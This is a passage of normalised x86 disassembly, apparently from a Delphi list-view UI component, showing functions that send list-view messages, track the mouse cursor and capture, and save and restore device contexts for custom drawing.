mov edx eax
mov eax [ esi + 0x37c ]
call [ esi + 0x378 ]
sub_3ade3e8
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x392 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x394 ]
call [ ebx + 0x390 ]
sub_3ade414
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ade485
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_3a65498
mov edx esi
mov eax ebx
call sub_3add204
mov esi eax
cmp [ ebx + 0x38a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x38c ]
call [ ebx + 0x388 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ade48c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3ada5a8
sub_3ade494
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x100 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x270 ]
pop ebx
retn
sub_3ade4b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x278 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_3ab03ec
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3ab4d0c
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab4c58
test al al
jne r-xdata
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_3ade52e
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_3ab0460
xor eax eax
mov [ ebx + 0x2bc ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_3aaf6c0
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x2b8 ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_3aded9c
mov esi eax
mov [ ebx + 0x2b8 ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab7c38
mov edi eax
mov eax esi
call sub_3ada9f8
mov ebp eax
lea eax [ esp + 0x8 ]
push eax
push ebp
push 0x1021
push edi
call __imp_SendMessageA
test eax eax
je r-xdata
mov ebx [ ebx + 0x270 ]
mov edx eax
mov eax ebx
call sub_3abebe4
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_3adaa14
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_3ab9a90
sub_3ade610
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3ab0480
mov eax [ ebx + 0x270 ]
call sub_3ab9c98
xor eax eax
mov [ ebx + 0x2bc ] eax
pop ebx
pop ebp
retn 0x4
sub_3ade63c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3ab72c0
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
call sub_3adebd0
mov [ esi + 0x2bc ] eax
xor edx edx
mov eax esi
call sub_3adebf8
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax esi
call sub_3aaf6c0
mov eax [ esp + 0x4 ]
push eax
cmp [ ebx + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax esi
call sub_3ade774
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ esi + 0x2bc ] eax
cmp [ esi + 0x290 ] 0x0
je r-xdata
jmp r-xdata
movzx eax [ esi + 0x25d ]
sub al 0x2
jae r-xdata
mov eax esi
call sub_3ade8ac
mov ebx eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_3a67378
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax esi
call sub_3aded30
mov ebx eax
jmp r-xdata
mov eax ebx
call sub_3ada9f8
push eax
mov eax [ esi + 0x278 ]
call sub_3adab94
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test ebx ebx
je r-xdata
inc edi
mov ebx eax
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x278 ]
call sub_3adabcc
xor ecx ecx
mov edx 0x1
call sub_3ada6fc
jmp r-xdata
mov edx ebx
mov eax [ esi + 0x278 ]
call sub_3adabcc
mov edx 0x1
call sub_3ada68c
test al al
je r-xdata
sub_3ade774
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_3aded9c
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_3adebd0
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x2bc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x2bc ]
jne r-xdata
movzx ecx [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_3ada6fc
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_3ada6fc
sub_3ade81c
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_3ab7c38
mov ebx eax
mov eax sub_3adb800
push eax
push 0x0
push 0x1030
push ebx
call __imp_SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_3ade854
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
movzx edx [ eax + 0x275 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x33a ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_3ade81c
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_3ade890
push ebx
push esi
mov esi edx
call sub_3ab7c38
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3ade8ac
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x25d ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab7c38
push 0x0
push 0x0
push 0x1027
push eax
call __imp_SendMessageA
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov esi eax
sub_3ade8ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x260 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x260 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2cc ]
call sub_3abf5ac
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3adc05c
mov edx [ ebx + 0x2cc ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x260 ]
call sub_3a83738
mov eax [ ebx + 0x260 ]
call sub_3abec10
mov edx eax
xor ecx ecx
mov eax ebx
call sub_3adc05c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ade960
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x268 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x268 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2d0 ]
call sub_3abf5ac
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_3adc05c
mov edx [ ebx + 0x2d0 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x268 ]
call sub_3a83738
mov eax [ ebx + 0x268 ]
call sub_3abec10
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_3adc05c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ade9dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x26c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x26c ] esi
cmp [ ebx + 0x2c0 ] 0x0
je r-xdata
mov edx [ ebx + 0x2d4 ]
call sub_3abf5ac
mov eax [ ebx + 0x26c ]
test eax eax
je r-xdata
mov eax ebx
call sub_3adc928
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_3adc05c
cmp [ ebx + 0x2c0 ] 0x0
je r-xdata
mov edx [ ebx + 0x2d4 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x26c ]
call sub_3a83738
mov eax [ ebx + 0x26c ]
call sub_3abec10
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_3adc05c
cmp [ ebx + 0x2c0 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
xor edx edx
mov eax ebx
call sub_3adc9ac
mov dl 0x1
mov eax ebx
call sub_3adc9ac
mov eax ebx
call sub_3adc89c
jmp r-xdata
sub_3adeaa4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3adeb3c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
or eax 0x2
movzx edx [ ebp + 0x8 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov [ ebp - 0x18 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_3ab7c38
lea edx [ ebp - 0x1c ]
push edx
push esi
push 0x100d
push eax
call __imp_SendMessageA
cmp eax 0xffffffff
je r-xdata
dec esi
xor ebx ebx
mov edx eax
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adeb43
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3adeb68
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
mov eax edi
call sub_3adeb50
mov ebx eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x100 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov cl 0x1
mov edx 0x3
mov eax ebx
call sub_3ada6fc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
dec esi
jne r-xdata
xor ecx ecx
mov edx 0x3
mov eax ebx
call sub_3ada6fc
movzx eax [ r-xdata ]
push eax
mov cl 0x4
mov edx ebx
mov eax edi
call sub_3adec5c
mov ebx eax
test ebx ebx
je r-xdata
sub_3adebd0
push ebx
mov ebx eax
movzx eax [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_3adec5c
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x2bc ]
sub_3adebf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_3adebd0
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_3ada6fc
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_3ada6fc
sub_3adec5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
movzx eax [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_3adec92 ]
or edi 0xffffffff
mov eax edi
call sub_3ada9f8
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_3ab7c38
mov ecx esi
mov edx edi
call sub_3a86970
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov [ ebp - 0x8 ] eax
sub_3aded30
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_3ab7c38
lea edx [ esp + 0x8 ]
push edx
push 0xffffffff
push 0x100d
push eax
call __imp_SendMessageA
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x278 ]
call sub_3adabcc
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_3aded9c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_3a67378
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_3ab7c38
mov edx esp
push edx
push 0x0
push 0x1012
push eax
call __imp_SendMessageA
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x278 ]
call sub_3adabcc
mov esi eax
sub_3adee08
push ebx
push esi
push edi
mov ebx edx
call sub_3ab7c38
mov edi eax
movzx eax bl
mov esi [ eax * 4 + rw-data ]
push 0x0
push esi
push 0x1016
push edi
call __imp_SendMessageA
pop edi
pop esi
pop ebx
retn
sub_3adee30
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2e5 ] 0x0
jne r-xdata
mov eax [ ebx + 0x288 ]
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_3adee70
inc edi
dec esi
jne r-xdata
sub_3adee70
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov ebp edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
mov edi eax
mov [ esp + 0x8 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ edi + 0x10 ]
call sub_3a65730
mov [ esp + 0x14 ] eax
movzx eax [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_3a7aebc
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0xc ] eax
mov eax ebx
mov si 0xffc7
call sub_3a6457c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
and [ esp + 0x8 ] 0xffffffef
mov eax [ esp + 0xc ]
or eax 0x800
or eax 0x8000
mov [ esp + 0xc ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov eax ebx
call sub_3ab7c38
mov esi eax
mov edx ebp
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
mov eax [ eax + 0x28 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push 0x101a
push esi
call __imp_SendMessageA
cmp [ ebx + 0x25d ] 0x2
jne r-xdata
or [ esp + 0x8 ] 0x2
mov [ esp + 0x10 ] eax
mov eax ebx
call sub_3ab7c38
mov esi eax
mov edx ebp
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
mov ebx [ eax + 0x28 ]
lea eax [ esp + 0x8 ]
push eax
push ebx
push 0x101a
push esi
call SendMessageA
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x25d ] 0x3
jne r-xdata
mov eax ebx
call sub_3ab7c38
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_3a869ec
jmp r-xdata
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x288 ]
call sub_3ad9dc0
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_3ab7c38
mov ecx [ edi + 0x24 ]
pop edx
call sub_3a869ec
sub_3adefdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
movzx eax [ edi + 0x4 ]
call sub_3ac44a4
mov ebx eax
mov [ esi + 0x27c ] 0x0
mov [ esi + 0x2b8 ] 0xffffffff
mov edx edi
mov eax esi
call sub_3ab17f8
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x27c ] 0x0
je r-xdata
cmp [ esi + 0x274 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_3aaf6c0
movzx eax [ esp + 0xc ]
mov [ esp + 0x14 ] ax
movzx eax [ esp + 0x10 ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x14 ]
mov [ esp + 0x8 ] eax
mov eax esi
call sub_3ab03ec
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x274 ] 0x0
je r-xdata
movzx eax [ esp + 0x8 ]
movzx eax ax
movzx edx [ esp + 0xa ]
movzx edx dx
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x202
call GetCapture
push eax
call __imp_SendMessageA
jmp r-xdata
movzx eax [ esp + 0x8 ]
movzx eax ax
movzx edx [ esp + 0xa ]
movzx edx dx
shl edx 0x10
or eax edx
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_3ab0e78
mov [ esi + 0x27c ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_3aded9c
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x27c ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_3ada68c
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_3aded9c
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_3ab02fc
mov edx 0x3
mov eax ebp
call sub_3ada68c
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_3ab02fc
jmp r-xdata
sub_3adf160
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_3adf2e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3aaf4fc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_3a7b21c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adf2eb
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_3adf2c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_3ad9b9c
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_3a7a33c
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_3a7a494
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx ebx
call sub_3ad9dc0
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_3a7a494
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_3ad9c1c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_3ad9b9c
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_3a7a388
mov eax esi
call sub_3ad9b9c
sub [ ebp - 0xc ] eax
sub_3adf2f4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab5f78
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3adf160
sub_3adf328
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x258 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
movzx ebx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3adf441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a8a25c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1a4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a8a278
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a89f04
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3adf448
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
call sub_3a8a234
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_3adf460
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x352 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x352 ] 0x0
jne r-xdata
cmp [ eax + 0x342 ] 0x0
jne r-xdata
cmp [ eax + 0x34a ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x302 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x34a ] 0x0
jne r-xdata
retn
xor eax eax
jmp r-xdata
mov al 0x1
retn
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x34a ] 0x0
jne r-xdata
cmp [ eax + 0x352 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
cmp [ eax + 0x352 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x30a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_3adf574
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2fa ] 0x0
je r-xdata
cmp [ esi + 0x342 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x344 ]
call [ esi + 0x340 ]
sub_3adf5cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x7 ] 0x1
test bl bl
jne r-xdata
